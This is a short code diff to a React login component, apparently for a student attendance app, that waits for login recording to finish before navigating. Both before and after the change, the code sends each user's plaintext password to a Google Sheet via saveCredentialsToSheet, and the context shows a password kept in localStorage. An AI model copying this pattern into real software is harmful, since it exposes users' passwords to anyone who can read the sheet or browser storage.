@@ -282,10 +282,16 @@ const Login = () => {
                     localStorage.removeItem('rememberedPassword');
                 }
 
-                saveCredentialsToSheet(cleanId, cleanPass);
-                if (typeof recordStudentLogin === 'function') {
-                    recordStudentLogin(cleanId).catch(() => {});
+                // Await login recording so Firestore (users, students, userLogins) and Google Sheet are 100% saved before route transition
+                try {
+                    await Promise.allSettled([
+                        typeof recordStudentLogin === 'function' ? recordStudentLogin(cleanId) : Promise.resolve(),
+                        saveCredentialsToSheet(cleanId, cleanPass)
+                    ]);
+                } catch (recErr) {
+                    console.warn('[Login] Record login notice:', recErr);
                 }
+
                 navigate('/attendance-register');
             }
         } catch (err) {
